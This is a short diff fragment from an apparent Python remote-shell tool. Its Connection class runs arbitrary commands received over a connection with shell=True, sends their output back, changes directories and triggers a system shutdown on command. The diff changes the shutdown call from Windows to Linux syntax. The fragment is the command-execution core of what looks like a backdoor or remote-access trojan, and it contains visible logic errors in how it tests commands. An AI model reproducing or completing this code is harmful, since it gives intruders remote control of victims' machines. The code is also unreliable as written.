@@ -50,7 +50,7 @@ class Connection:
                     z=os.chdir(x)
                     C.send(bytes(x,'utf-8'))
                 if z[0]=='shutdown' or z[0]=='Shutdown' and len(z)>=1:
-                    os.system("shutdown /s /t 1")
+                    os.system("shutdown now")
                 else:
                     com=subprocess.run(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
                     x=com.stdout.decode()+com.stderr.decode()
